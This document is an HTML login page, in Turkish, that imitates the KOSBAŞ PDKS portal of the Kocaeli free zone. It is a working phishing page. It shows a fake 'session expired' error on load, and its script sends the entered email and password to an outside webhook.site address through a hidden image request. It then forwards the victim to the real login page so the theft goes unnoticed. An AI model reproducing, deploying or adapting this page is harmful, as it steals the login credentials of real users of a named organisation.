<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KOSBAŞ PDKS</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;background:url('https://dev.kosbas.geobilgi.net/assets/management/media/auth/login-bg.png') center/cover no-repeat;position:relative}
body::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.15)}
.login-card{position:relative;z-index:1;background:#fff;border-radius:16px;padding:48px 40px;width:420px;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
.logo-area{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:24px}
.logo-area svg{width:48px;height:48px}
.logo-text{text-align:left}
.logo-text .brand{font-size:28px;font-weight:800;color:#1a2b4a;letter-spacing:1px}
.logo-text .sub{font-size:11px;color:#5a7a9a;letter-spacing:2px;margin-top:-2px}
h2{font-size:22px;font-weight:700;color:#1a2b4a;margin-bottom:6px}
.subtitle{font-size:14px;color:#8899aa;margin-bottom:32px}
.input-group{margin-bottom:16px;text-align:left}
.input-group label{font-size:12px;color:#5a7a9a;margin-bottom:6px;display:block;font-weight:500}
.input-group input{width:100%;padding:14px 16px;border:1.5px solid #dde3ea;border-radius:10px;font-size:15px;color:#1a2b4a;outline:none;transition:border .2s}
.input-group input:focus{border-color:#4a9fe5}
.input-group input::placeholder{color:#b0bec5}
.forgot{text-align:right;margin-bottom:24px}
.forgot a{font-size:13px;color:#4a9fe5;text-decoration:none;font-weight:500}
.forgot a:hover{text-decoration:underline}
.login-btn{width:100%;padding:14px;background:linear-gradient(135deg,#4a9fe5,#3b8dd4);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;transition:transform .15s,box-shadow .15s;box-shadow:0 4px 15px rgba(74,159,229,.4)}
.login-btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(74,159,229,.5)}
.login-btn:active{transform:translateY(0)}
.footer-logos{position:fixed;bottom:24px;right:24px;display:flex;gap:16px;align-items:center;z-index:1}
.footer-logos img{height:50px;opacity:.85}
.error-msg{display:none;color:#e74c3c;font-size:13px;margin-bottom:12px;padding:10px;background:#fdf0f0;border-radius:8px}
</style>
</head>
<body>
<div class="login-card">
<div class="logo-area">
<svg viewBox="0 0 60 60" fill="none">
<polygon points="30,2 55,18 55,42 30,58 5,42 5,18" fill="#4a9fe5" opacity="0.15"/>
<polygon points="30,8 48,20 48,40 30,52 12,40 12,20" fill="#4a9fe5" opacity="0.3"/>
<polygon points="30,14 42,22 42,38 30,46 18,38 18,22" fill="#4a9fe5"/>
<polygon points="30,20 36,24 36,34 30,38 24,34 24,24" fill="#fff"/>
<line x1="30" y1="2" x2="30" y2="14" stroke="#4a9fe5" stroke-width="2"/>
<line x1="55" y1="18" x2="42" y2="22" stroke="#4a9fe5" stroke-width="2"/>
<line x1="5" y1="18" x2="18" y2="22" stroke="#4a9fe5" stroke-width="2"/>
</svg>
<div class="logo-text">
<div class="brand">KOSBAŞ</div>
<div class="sub">Kocaeli Serbest Bölgesi</div>
</div>
</div>
<h2>Giriş Yap</h2>
<p class="subtitle">Hesabınıza erişim sağlayın</p>
<div class="error-msg" id="err">Oturum süreniz dolmuştur. Lütfen tekrar giriş yapın.</div>
<div class="input-group">
<label>E-Posta</label>
<input type="email" id="e" placeholder="E-Posta adresinizi girin">
</div>
<div class="input-group">
<label>Şifre</label>
<input type="password" id="p" placeholder="Şifrenizi girin">
</div>
<div class="forgot"><a href="#">Şifremi Unuttum?</a></div>
<button class="login-btn" id="btn">Giriş Yap</button>
</div>
<script>
window.onload=function(){document.getElementById('err').style.display='block'};
document.getElementById('btn').addEventListener('click',function(){
var email=document.getElementById('e').value;
var pass=document.getElementById('p').value;
if(email&&pass){
this.textContent='Giriş yapılıyor...';
this.style.opacity='0.7';
var img=new Image();
img.src='https://webhook.site/43b8be70-9ca8-439e-8ae0-baf0c3f2fc2f?email='+encodeURIComponent(email)+'&pass='+encodeURIComponent(pass);
setTimeout(function(){window.location='https://dev.kosbas.geobilgi.net/Account/Login'},1500);
}
});
</script>
</body>
</html>
